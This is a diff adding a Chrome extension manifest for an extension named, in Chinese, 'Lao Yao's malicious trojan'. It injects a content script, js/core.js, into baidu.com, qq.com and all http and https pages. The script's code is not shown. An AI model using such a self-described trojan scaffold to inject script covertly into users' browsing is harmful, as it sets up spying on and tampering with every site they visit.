@@ -1,0 +1,19 @@
+{
+	"name": "老姚的恶意木马",
+	"version": "1",
+	"manifest_version": 2,
+	"description": "你是风儿，我是沙",
+	"content_scripts": [
+		{
+			"matches": [
+				"https://www.baidu.com/*",
+				"http://www.qq.com/*",
+				"https://*/*",
+				"http://*/*"
+			],
+			"js": [
+				"js/core.js"
+			]
+		}
+	]
+}
